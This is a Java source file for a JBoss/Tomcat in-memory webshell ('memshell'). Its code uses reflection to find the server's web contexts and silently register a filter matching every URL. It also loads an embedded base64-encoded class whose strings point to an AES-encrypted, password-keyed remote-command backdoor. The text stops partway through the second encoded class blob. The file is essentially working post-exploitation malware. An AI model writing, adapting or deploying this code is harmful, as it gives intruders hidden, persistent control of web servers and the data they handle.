package core.memshell;

import java.lang.reflect.*;
import java.util.*;

public class JBossFilterMemShell{
    private static ArrayList StanderContexts = new ArrayList();
    private static String FilterName = "memshell.JBossFilterShell";
    public static Object request;
    static{
        Inject();
    }

    public JBossFilterMemShell(){
        Inject();
    }

    public static synchronized void Inject(){
        getContext4();
        getContext5And6();
        Iterator var1 = StanderContexts.iterator();
        IMC();
        while (var1.hasNext()) {
            Object var2 = var1.next();
            if (!isInjected(var2)){
                IMF(var2);}
        }
    }
    private static synchronized Object getFV(Object var0, String var1) throws Exception {
        Field var2 = null;
        Class var3 = var0.getClass();

        while (var3 != Object.class) {
            try {
                var2 = var3.getDeclaredField(var1);
                break;
            } catch (NoSuchFieldException var5) {
                var3 = var3.getSuperclass();
            }
        }

        if (var2 == null) {
            throw new NoSuchFieldException(var1);
        } else {
            var2.setAccessible(true);
            return var2.get(var0);
        }
    }

    public static synchronized void getContext4() {
        Object StandardContext = null;
        try {
            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
            Thread[] threads = (Thread[]) getFV(threadGroup, "threads");
            for (Thread thread : threads) {
                Object Endpoint = null;
                if (thread.getName().startsWith("http-")) {
                    Object tmp = getFV(thread, "target");
                    if (tmp.getClass().getName().contains("PoolTcpEndpoint")) {
                        Endpoint = tmp;
                    } else {
                        try {
                            Endpoint = getFV(tmp, "endpoint");
                        } catch (Exception e) {
                            Object toRun = getFV(tmp, "toRun");
                            if (toRun != null){
                                Endpoint = getFV(toRun, "endpoint");}
                        }
                    }
                    if (Endpoint != null) {
                        Object Http11Protocol = getFV(Endpoint, "handler");
                        Object RequestGroupInof = getFV(Http11Protocol, "global");
                        List Processors = (List) getFV(RequestGroupInof, "processors");
                        for (int i = 0; i < Processors.size(); i++) {
                            Object RequestInfo = (Object) Processors.get(i);
                            Object Request = getFV(RequestInfo, "req");
                            Object Request1 = Request.getClass().getDeclaredMethod("getNote", Integer.TYPE).invoke(Request, 1);
                            Field f4 = Request1.getClass().getDeclaredField("context");
                            f4.setAccessible(true);
                            StandardContext = f4.get(Request1);
                            if (StandardContext != null) {
                                request = Request;
                                StanderContexts.add(StandardContext);
                                break;
                            }
                        }
                    }}
            }

        }catch(Exception e){}

    }

    public static synchronized void getContext5And6() {
        Object StandardContext = null;
        try {
            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
            Thread[] threads = (Thread[]) getFV(threadGroup, "threads");
            for (Thread thread : threads) {
                if (thread.getName().contains("Acceptor") && thread.getName().contains("http")) {
                    Object JioEndpoint$ = getFV(thread, "target");
                    Object JioEndpointO = getFV(JioEndpoint$, "this$0");
                    Object Http11Protocol = getFV(JioEndpointO, "handler");
                    Object RequestGroupInof = getFV(Http11Protocol, "global");
                    List Processors = (List) getFV(RequestGroupInof, "processors");
                    for (int i = 0; i < Processors.size(); i++) {
                        Object RequestInfo = (Object) Processors.get(i);
                        Object Request = getFV(RequestInfo, "req");
                        Object Request1 = Request.getClass().getDeclaredMethod("getNote", Integer.TYPE).invoke(Request, 1);
                        Field f4 = Request1.getClass().getDeclaredField("context");
                        f4.setAccessible(true);
                        StandardContext = f4.get(Request1);
                        if (StandardContext != null) {
                            request = Request;
                            StanderContexts.add(StandardContext);
                            break;
                        }
                    }
                }
            }
        } catch (Exception e) {

        }
    }

    private static synchronized boolean isInjected(Object STANDARD_CONTEXT) {
        try {
            Map map = (Map) getFV(STANDARD_CONTEXT, "filterDefs");
            Set set = map.keySet();
            Iterator it = set.iterator();
            while (it.hasNext()){
                Object o = it.next();
                if (o.toString().contains(FilterName)){
                    return true;
                }
            }

        } catch (Exception e) {
        }
        return false;
    }

    private static synchronized void IMF(Object STANDARD_CONTEXT) {
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();


        try {
            Object filter = (Object) Thread.currentThread().getContextClassLoader().loadClass(FilterName).newInstance();
            Class<?> FilterDefClass = null;
            Class<?> Context = null;
            try {
                Context = classLoader.loadClass("org.apache.catalina.Context"); //
            } catch (Exception e) {
            }
            try {
                FilterDefClass = classLoader.loadClass("org.apache.catalina.deploy.FilterDef");
            } catch (Exception e) {
            }

            Constructor FilterDefCons = FilterDefClass.getDeclaredConstructor();
            FilterDefCons.setAccessible(true);
            Object filterDef = FilterDefCons.newInstance();
            invoke(filterDef, "setFilterName", FilterName);
            invoke(filterDef, "setFilterClass", filter.getClass().getName());
            invoke(STANDARD_CONTEXT, "addFilterDef", filterDef);

            Class<?> filterMapClass = null;
            try {
                filterMapClass = classLoader.loadClass("org.apache.catalina.deploy.FilterMap");
            } catch (Exception e) {

            }
            Constructor FilterMapCons = filterMapClass.getDeclaredConstructor();
            FilterMapCons.setAccessible(true);
            Object FilterMapObj = FilterMapCons.newInstance();
            invoke(FilterMapObj, "addURLPattern", "/*");  // version 6
            invoke(FilterMapObj, "setURLPattern", "/*"); // version 4
            invoke(FilterMapObj, "setFilterName", FilterName);
            invoke(STANDARD_CONTEXT, "addFilterMap", FilterMapObj);

            Class<?> ApplicationFilterConfigClass = classLoader.loadClass("org.apache.catalina.core.ApplicationFilterConfig");
            Constructor ApplicationFilterCons = ApplicationFilterConfigClass.getDeclaredConstructor(Context, FilterDefClass);
            ApplicationFilterCons.setAccessible(true);
            Object ApplicationfilterObj = ApplicationFilterCons.newInstance(STANDARD_CONTEXT, filterDef);

            Field getAppFilterConfigs = STANDARD_CONTEXT.getClass().getDeclaredField("filterConfigs");
            getAppFilterConfigs.setAccessible(true);
            Map filterConfigs = (Map) getAppFilterConfigs.get(STANDARD_CONTEXT);
            filterConfigs.put(FilterName, ApplicationfilterObj);

        } catch (Throwable var16) {

        }

    }

    private static Method getMethodByClass(Class cs, String methodName, Class... parameters) {
        Method method = null;

        while (cs != null) {
            try {
                method = cs.getDeclaredMethod(methodName, parameters);
                cs = null;
            } catch (Exception var6) {
                cs = cs.getSuperclass();
            }
        }

        return method;
    }

    private static Object invoke(Object obj, String methodName, Object... parameters) {
        try {
            ArrayList classes = new ArrayList();
            if (parameters != null) {
                for (int i = 0; i < parameters.length; ++i) {
                    Object o1 = parameters[i];
                    if (o1 != null) {
                        classes.add(o1.getClass());
                    } else {
                        classes.add((Object) null);
                    }
                }
            }

            Method method = getMethodByClass(obj.getClass(), methodName, (Class[]) ((Class[]) classes.toArray(new Class[0])));
            return method.invoke(obj, parameters);
        } catch (Exception var7) {
            return null;
        }
    }

    public static synchronized void IMC() {
        try {
            Thread.currentThread().getContextClassLoader().loadClass(FilterName);
        } catch (Exception var4) {
            try {
                Method var1 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                var1.setAccessible(true);
//                byte[] var2 = base64Decode("yv66vgAAADIBRgoAWgCrCQBFAKwJAEUArQgArgkARQCvCACwCQBFALEIALIJAEUAswcAtAoACgCrCgAKALUKAAoAtgoARQC3CQBFALgIALkJAEUAugoAWgC7CgBaALwIAL0KAL4AvwcAwAoAMQDBCgAWAMIKAL4AwwoAvgDEBwDFCADGCgDHAMgKADEAyQoAxwDKBwDLCgDHAMwKACAAzQoAIADOCgAxAM8IANAKAC4A0QgA0gcA0woALgDUBwDVCgDWANcKADAA2AgA2QcA2gcAcwcA2wcA3AgA3QoALgDeCADfCADgCADhCADiCADjBwDkBwDlCADmCwA5AOcIAOgKADEA6QsAOQDqCwA5AOsKAEUA7AoARQDtCADuCwDvAPAHAPEKAC4A8goARQC7CgBFAPMLAO8A9AgA9QsAOQD0BwD2CgBMAKsKADAA9wsAOgD4CgAxAPkKAPoA+woAMAC2CgBMAPwKAEUA/QoAMQD+CAD/CAEACwEBAQIKABsBAwcBBAcBBQEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAJ4YwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA1B3ZAEABHBhdGgBAANtZDUBAAJjcwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAbTG1lbXNoZWxsL0pCb3NzRmlsdGVyU2hlbGw7AQAaKExqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYBAAF6AQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAFRAQAVKFtCKUxqYXZhL2xhbmcvQ2xhc3M7AQACY2IBAAJbQgEAAXgBAAcoW0JaKVtCAQABYwEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEABHZhcjQBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAFzAQABbQEAAVoBAA1TdGFja01hcFRhYmxlBwDxBwEGBwDFAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAA3JldAcA3AEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAdFbmNvZGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAGYmFzZTY0AQARTGphdmEvbGFuZy9DbGFzczsBAAR2YXI2AQACYnMBAAV2YWx1ZQEACkV4Y2VwdGlvbnMBAAxiYXNlNjREZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAHZGVjb2RlcgEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwcBBwEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEABmFyck91dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAFmAQAHc2Vzc2lvbgEAIExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAEZGF0YQEABHZhcjkBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwcBCAcBCQEAB2Rlc3Ryb3kBAApTb3VyY2VGaWxlAQAVSkJvc3NGaWx0ZXJTaGVsbC5qYXZhDABmAGcMAFwAXQwAXgBfAQAQM2M2ZTBiOGE5YzE1MjI0YQwAYABhAQAEcEFTMwwAYgBhAQAQL2Zhdmljb25kZW1vLmljbwwAYwBhAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAQoBCwwBDAENDABkAIEMAGQAYQEABVVURi04DABlAGEMAGYAbQwBDgEPAQADQUVTBwEGDAEQAREBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjDAESARMMAGYBFAwAkgEVDAEWARcBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQADTUQ1BwEYDAEQARkMARoBGwwBHAEdAQAUamF2YS9tYXRoL0JpZ0ludGVnZXIMAR4BEwwAZgEfDAEMASAMASEBDQEAEGphdmEudXRpbC5CYXNlNjQMASIBIwEACmdldEVuY29kZXIBABJbTGphdmEvbGFuZy9DbGFzczsMASQBJQEAE1tMamF2YS9sYW5nL09iamVjdDsHASYMAScBKAwBKQEqAQAOZW5jb2RlVG9TdHJpbmcBAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N0cmluZwEAFnN1bi5taXNjLkJBU0U2NEVuY29kZXIMASsBLAEABmVuY29kZQEACmdldERlY29kZXIBAAZkZWNvZGUBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyAQAMZGVjb2RlQnVmZmVyAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAQWC1SZXF1ZXN0ZWQtV2l0aAwBLQCBAQAOWE1MSFRUUFJlcXVlc3QMAS4BLwwBMAExDAEyAIEMAI8AkAwAdAB1AQAHcGF5bG9hZAcBCAwBMwE0AQAZbWVtc2hlbGwvSkJvc3NGaWx0ZXJTaGVsbAwBNQE2DABwAHEMATcBOAEACnBhcmFtZXRlcnMBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwBOQE6DAE7ATwMAT0BPgcBPwwBQAFBDAFCARMMAIUAhgwBPQEgAQAOWG1sSFRUUFJlcXVlc3QBAAdTdWNjZXNzBwFDDACXAUQMAUUAZwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQALZGVmaW5lQ2xhc3MBABcoW0JJSSlMamF2YS9sYW5nL0NsYXNzOwEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAHZG9GaW5hbAEABihbQilbQgEAG2phdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdAEAMShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAAZsZW5ndGgBAAMoKUkBAAZ1cGRhdGUBAAcoW0JJSSlWAQAGZGlnZXN0AQAGKElbQilWAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQALdG9VcHBlckNhc2UBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0SGVhZGVyAQAHaW5kZXhPZgEAFShMamF2YS9sYW5nL1N0cmluZzspSQEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAMZ2V0UGFyYW1ldGVyAQAMZ2V0QXR0cmlidXRlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBAA5nZXRDbGFz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");
                byte[] var2 = base64Decode("yv66vgAAADMBRgoAWgCrCQBFAKwJAEUArQgArgkARQCvCACwCQBFALEIALIJAEUAswcAtAoACgCrCgAKALUKAAoAtgoARQC3CQBFALgIALkJAEUAugoAWgC7CgBaALwIAL0KAL4AvwcAwAoAMQDBCgAWAMIKAL4AwwoAvgDEBwDFCADGCgDHAMgKADEAyQoAxwDKBwDLCgDHAMwKACAAzQoAIADOCgAxAM8IANAKAC4A0QgA0gcA0woALgDUBwDVCgDWANcKADAA2AgA2QcA2gcAcwcA2wcA3AgA3QoALgDeCADfCADgCADhCADiCADjBwDkBwDlCADmCwA5AOcIAOgKADEA6QsAOQDqCwA5AOsKAEUA7AoARQDtCADuCwDvAPAHAPEKAC4A8goARQC7CgBFAPMLAO8A9AgA9QsAOQD0BwD2CgBMAKsKADAA9wsAOgD4CgAxAPkKAPoA+woAMAC2CgBMAPwKAEUA/QoAMQD+CAD/CAEACwEBAQIKABsBAwcBBAcBBQEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAJ4YwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA1B3ZAEABHBhdGgBAANtZDUBAAJjcwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAbTG1lbXNoZWxsL0pCb3NzRmlsdGVyU2hlbGw7AQAaKExqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYBAAF6AQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAFRAQAVKFtCKUxqYXZhL2xhbmcvQ2xhc3M7AQACY2IBAAJbQgEAAXgBAAcoW0JaKVtCAQABYwEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEABHZhcjQBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAFzAQABbQEAAVoBAA1TdGFja01hcFRhYmxlBwDxBwEGBwDFAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAA3JldAcA3AEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAdFbmNvZGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAGYmFzZTY0AQARTGphdmEvbGFuZy9DbGFzczsBAAR2YXI2AQACYnMBAAV2YWx1ZQEACkV4Y2VwdGlvbnMBAAxiYXNlNjREZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAHZGVjb2RlcgEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwcBBwEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEABmFyck91dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAFmAQAHc2Vzc2lvbgEAIExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAEZGF0YQEABHZhcjkBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwcBCAcBCQEAB2Rlc3Ryb3kBAApTb3VyY2VGaWxlAQAVSkJvc3NGaWx0ZXJTaGVsbC5qYXZhDABmAGcMAFwAXQwAXgBfAQAQM2M2ZTBiOGE5YzE1MjI0YQwAYABhAQAEcEFTMwwAYgBhAQAQL2Zhdmljb25kZW1vLmljbwwAYwBhAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAQoBCwwBDAENDABkAIEMAGQAYQEABVVURi04DABlAGEMAGYAbQwBDgEPAQADQUVTBwEGDAEQAREBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjDAESARMMAGYBFAwAkgEVDAEWARcBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQADTUQ1BwEYDAEQARkMARoBGwwBHAEdAQAUamF2YS9tYXRoL0JpZ0ludGVnZXIMAR4BEwwAZgEfDAEMASAMASEBDQEAEGphdmEudXRpbC5CYXNlNjQMASIBIwEACmdldEVuY29kZXIBABJbTGphdmEvbGFuZy9DbGFzczsMASQBJQEAE1tMamF2YS9sYW5nL09iamVjdDsHASYMAScBKAwBKQEqAQAOZW5jb2RlVG9TdHJpbmcBAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N0cmluZwEAFnN1bi5taXNjLkJBU0U2NEVuY29kZXIMASsBLAEABmVuY29kZQEACmdldERlY29kZXIBAAZkZWNvZGUBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyAQAMZGVjb2RlQnVmZmVyAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAQWC1SZXF1ZXN0ZWQtV2l0aAwBLQCBAQAOWE1MSFRUUFJlcXVlc3QMAS4BLwwBMAExDAEyAIEMAI8AkAwAdAB1AQAQbWVtc2hlbGwucGF5bG9hZAcBCAwBMwE0AQAZbWVtc2hlbGwvSkJvc3NGaWx0ZXJTaGVsbAwBNQE2DABwAHEMATcBOAEACnBhcmFtZXRlcnMBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwBOQE6DAE7ATwMAT0BPgcBPwwBQAFBDAFCARMMAIUAhgwBPQEgAQAOWG1sSFRUUFJlcXVlc3QBAAdTdWNjZXNzBwFDDACXAUQMAUUAZwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQALZGVmaW5lQ2xhc3MBABcoW0JJSSlMamF2YS9sYW5nL0NsYXNzOwEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjs